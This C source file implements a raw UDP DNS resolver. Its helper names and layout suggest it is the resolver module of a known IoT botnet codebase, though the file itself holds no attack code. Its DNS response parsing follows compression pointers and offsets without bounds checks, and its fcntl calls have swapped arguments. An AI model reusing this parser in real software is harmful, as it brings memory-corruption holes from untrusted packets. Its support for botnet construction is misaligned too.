#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <sys/select.h>
#include <errno.h>

#include "headers/resolver.h"
#include "headers/includes.h"
#include "headers/util.h"
#include "headers/rand.h"
#include "headers/protocol.h"
#include "../modules/debug.h"

void domain_to_hostname(char *dst_hostname, char *src_domain)
{
    int len = _strlen(src_domain) + 1;
    char *lbl = dst_hostname, *dst_pos = dst_hostname + 1;
    uint8_t curr_len = 0;

    while (len-- > 0)
    {
        char c = *src_domain++;

        if (c == '.' || c == 0)
        {
            *lbl = curr_len;
            lbl = dst_pos++;
            curr_len = 0;
        }
        else
        {
            curr_len++;
            *dst_pos++ = c;
        }
    }
    *dst_pos = 0;
}

static void skip_name(uint8_t *reader, uint8_t *buffer, int *count)
{
    unsigned int jumped = 0, offset;
    *count = 1;
    while (*reader != 0)
    {
        if (*reader >= 192)
        {
            offset = (*reader) * 256 + *(reader + 1) - 49152;
            reader = buffer + offset - 1;
            jumped = 1;
        }
        reader = reader + 1;
        if (jumped == 0)
            *count = *count + 1;
    }

    if (jumped == 1)
        *count = *count + 1;
}

struct resolved *lookup_domain(char *domain)
{
    debug("Resolving %s\n", domain);
    struct resolved *entries = calloc(1, sizeof(struct resolved));
    char query[2048], response[2048];
    struct dnshdr *dnsh = (struct dnshdr *)query;
    char *qname = (char *)(dnsh + 1);

    domain_to_hostname(qname, domain);

    struct dns_question *dnst = (struct dns_question *)(qname + _strlen(qname) + 1);
    struct sockaddr_in addr = {0};
    int query_len = sizeof(struct dnshdr) + _strlen(qname) + 1 + sizeof(struct dns_question);
    int tries = 0, fd = -1, i = 0;
    uint16_t dns_id = rand_next() % 0xffff;

    _zero(&addr, sizeof(struct sockaddr_in));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = _opennic_dns();
    addr.sin_port = htons(53);

    // Set up the dns query
    dnsh->id = dns_id;
    dnsh->opts = htons(1 << 8); // Recursion desired
    dnsh->qdcount = htons(1);
    dnst->qtype = htons(PROTO_DNS_QTYPE_A);
    dnst->qclass = htons(PROTO_DNS_QCLASS_IP);

    while (tries++ < 5)
    {
        fd_set fdset;
        struct timeval timeo;
        int nfds;

        if (fd != -1)
            close(fd);
        if ((fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
        {
            debug("failed to create socket\r\n");
            sleep(1);
            continue;
        }

        if (connect(fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1)
        {
            debug("failed to call connect\r\n");
            sleep(1);
            continue;
        }

        if (send(fd, query, query_len, MSG_NOSIGNAL) == -1)
        {
            debug("failed to create packet\r\n");
            sleep(1);
            continue;
        }

        fcntl(F_SETFL, fd, O_NONBLOCK | fcntl(F_GETFL, fd, 0));
        FD_ZERO(&fdset);
        FD_SET(fd, &fdset);

        timeo.tv_sec = 5;
        timeo.tv_usec = 0;
        nfds = select(fd + 1, &fdset, NULL, NULL, &timeo);

        if (nfds == -1)
        {
            debug("failed to select\r\n");
            break;
        }
        else if (nfds == 0)
        {
            debug("Failed to resolve %s in time. %d tr%s\n", domain, tries, tries == 1 ? "y" : "ies");
            continue;
        }
        else if (FD_ISSET(fd, &fdset))
        {
            int ret = recvfrom(fd, response, sizeof(response), MSG_NOSIGNAL, NULL, NULL);
            char *name;
            struct dnsans *dnsa;
            uint16_t ancount;
            int stop;

            if (ret < (sizeof(struct dnshdr) + _strlen(qname) + 1 + sizeof(struct dns_question)))
            {
                continue;
            }

            dnsh = (struct dnshdr *)response;
            qname = (char *)(dnsh + 1);
            dnst = (struct dns_question *)(qname + _strlen(qname) + 1);
            name = (char *)(dnst + 1);

            if (dnsh->id != dns_id)
            {
                continue;
            }
            if (dnsh->ancount == 0)
            {
                continue;
            }

            ancount = ntohs(dnsh->ancount);
            while (ancount-- > 0)
            {
                struct dns_resource *r_data = NULL;

                skip_name(name, response, &stop);
                name = name + stop;

                r_data = (struct dns_resource *)name;
                name = name + sizeof(struct dns_resource);

                if (r_data->type == htons(PROTO_DNS_QTYPE_A) && r_data->_class == htons(PROTO_DNS_QCLASS_IP))
                {
                    if (ntohs(r_data->data_len) == 4)
                    {
                        uint32_t *p;
                        uint8_t tmp_buf[4];
                        for (i = 0; i < 4; i++)
                            tmp_buf[i] = name[i];

                        p = (uint32_t *)tmp_buf;

                        entries->addrs = realloc(entries->addrs, (entries->addrs_len + 1) * sizeof(uint32_t));
                        entries->addrs[entries->addrs_len++] = (*p);
                        debug("Found ip address: %d.%d.%d.%d\r\n", CONVERT_ADDR(*p));
                    }

                    name = name + ntohs(r_data->data_len);
                }
                else
                {
                    skip_name(name, response, &stop);
                    name = name + stop;
                }
            }
        }

        break;
    }

    close(fd);

    if (entries->addrs_len > 0)
    {
        return entries;
    }
    else
    {
        free_entries(entries);
        return NULL;
    }
}

struct resolved *lookup_domain_custom(char *domain, char *dns_server)
{
    struct resolved *entries = calloc(1, sizeof(struct resolved));
    char query[2048], response[2048];
    struct dnshdr *dnsh = (struct dnshdr *)query;
    char *qname = (char *)(dnsh + 1);

    domain_to_hostname(qname, domain);

    struct dns_question *dnst = (struct dns_question *)(qname + _strlen(qname) + 1);
    struct sockaddr_in addr = {0};
    int query_len = sizeof(struct dnshdr) + _strlen(qname) + 1 + sizeof(struct dns_question);
    int tries = 0, fd = -1, i = 0;
    uint16_t dns_id = rand_next() % 0xffff;

    _zero(&addr, sizeof(struct sockaddr_in));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr(dns_server);
    addr.sin_port = htons(53);

    // Set up the dns query
    dnsh->id = dns_id;
    dnsh->opts = htons(1 << 8); // Recursion desired
    dnsh->qdcount = htons(1);
    dnst->qtype = htons(PROTO_DNS_QTYPE_A);
    dnst->qclass = htons(PROTO_DNS_QCLASS_IP);

    while (tries++ < 5)
    {
        fd_set fdset;
        struct timeval timeo;
        int nfds;

        if (fd != -1)
            close(fd);
        if ((fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
        {
            debug("failed to create socket\r\n");
            sleep(1);
            continue;
        }

        if (connect(fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1)
        {
            debug("failed to call connect\r\n");
            sleep(1);
            continue;
        }

        if (send(fd, query, query_len, MSG_NOSIGNAL) == -1)
        {
            debug("failed to create packet\r\n");
            sleep(1);
            continue;
        }

        fcntl(F_SETFL, fd, O_NONBLOCK | fcntl(F_GETFL, fd, 0));
        FD_ZERO(&fdset);
        FD_SET(fd, &fdset);

        timeo.tv_sec = 5;
        timeo.tv_usec = 0;
        nfds = select(fd + 1, &fdset, NULL, NULL, &timeo);

        if (nfds == -1)
        {
            debug("failed to select\r\n");
            break;
        }
        else if (nfds == 0)
        {
            debug("Failed to resolve %s in time. %d tr%s\n", domain, tries, tries == 1 ? "y" : "ies");
            continue;
        }
        else if (FD_ISSET(fd, &fdset))
        {
            int ret = recvfrom(fd, response, sizeof(response), MSG_NOSIGNAL, NULL, NULL);
            char *name;
            struct dnsans *dnsa;
            uint16_t ancount;
            int stop;

            if (ret < (sizeof(struct dnshdr) + _strlen(qname) + 1 + sizeof(struct dns_question)))
            {
                continue;
            }

            dnsh = (struct dnshdr *)response;
            qname = (char *)(dnsh + 1);
            dnst = (struct dns_question *)(qname + _strlen(qname) + 1);
            name = (char *)(dnst + 1);

            if (dnsh->id != dns_id)
            {
                continue;
            }
            if (dnsh->ancount == 0)
            {
                continue;
            }

            ancount = ntohs(dnsh->ancount);
            while (ancount-- > 0)
            {
                struct dns_resource *r_data = NULL;

                skip_name(name, response, &stop);
                name = name + stop;

                r_data = (struct dns_resource *)name;
                name = name + sizeof(struct dns_resource);

                if (r_data->type == htons(PROTO_DNS_QTYPE_A) && r_data->_class == htons(PROTO_DNS_QCLASS_IP))
                {
                    if (ntohs(r_data->data_len) == 4)
                    {
                        uint32_t *p;
                        uint8_t tmp_buf[4];
                        for (i = 0; i < 4; i++)
                            tmp_buf[i] = name[i];

                        p = (uint32_t *)tmp_buf;

                        entries->addrs = realloc(entries->addrs, (entries->addrs_len + 1) * sizeof(uint32_t));
                        entries->addrs[entries->addrs_len++] = (*p);
                    }

                    name = name + ntohs(r_data->data_len);
                }
                else
                {
                    skip_name(name, response, &stop);
                    name = name + stop;
                }
            }
        }

        break;
    }

    close(fd);

    if (entries->addrs_len > 0)
    {
        return entries;
    }
    else
    {
        free_entries(entries);
        return NULL;
    }
}

void free_entries(struct resolved *entries)
{
    if (entries == NULL)
        return;
    if (entries->addrs != NULL)
        free(entries->addrs);
    free(entries);
}
